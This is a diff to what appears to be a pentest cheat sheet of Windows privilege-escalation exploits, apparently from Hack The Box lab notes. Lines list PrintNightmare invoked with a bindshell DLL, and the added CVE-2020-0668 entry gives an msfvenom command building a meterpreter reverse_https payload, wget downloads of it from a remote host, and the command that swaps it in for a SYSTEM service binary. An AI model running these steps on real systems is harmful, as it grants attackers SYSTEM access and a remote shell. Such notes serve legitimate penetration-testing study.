@@ -252,7 +252,13 @@ MS17-010
 ALPC Task Scheduler 0-Day
 CVE-2021-36934 HiveNightmare https://github.com/GossiTheDog/HiveNightmare/tree/master/Release
 CVE-2021-1675/CVE-2021-34527 PrintNightmare Import-Module .\cve-2021-1675.ps1 Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
-CVE-2020-0668
+CVE-2020-0668 https://github.com/RedCursorSecurityConsulting/CVE-2020-0668:
+Mozilla Maintenance service runs in the context of SYSTEM and is startable by unprivileged users.The (non-system protected) binary for this service is located below
+C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
+PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
+PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe
+CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
 
 watson.exe
 
